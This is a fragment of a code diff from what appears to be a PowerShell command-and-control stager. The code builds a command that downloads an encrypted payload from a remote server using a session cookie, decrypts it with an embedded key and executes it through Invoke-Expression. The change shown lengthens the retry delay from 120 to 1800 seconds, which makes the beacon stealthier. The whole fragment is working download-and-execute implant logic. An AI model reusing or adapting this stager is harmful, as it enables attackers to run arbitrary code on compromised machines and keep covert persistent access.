@@ -96,7 +96,7 @@ $primer = (Get-Webclient -Cookie $pp).downloadstring($s)
 dec -key '+$enckey+' -enc $primer} 
 $primer = primer
 if ($primer) {$primer| iex} else {
-start-sleep 120
+start-sleep 1800
 primer | iex }'
 return $command
 }
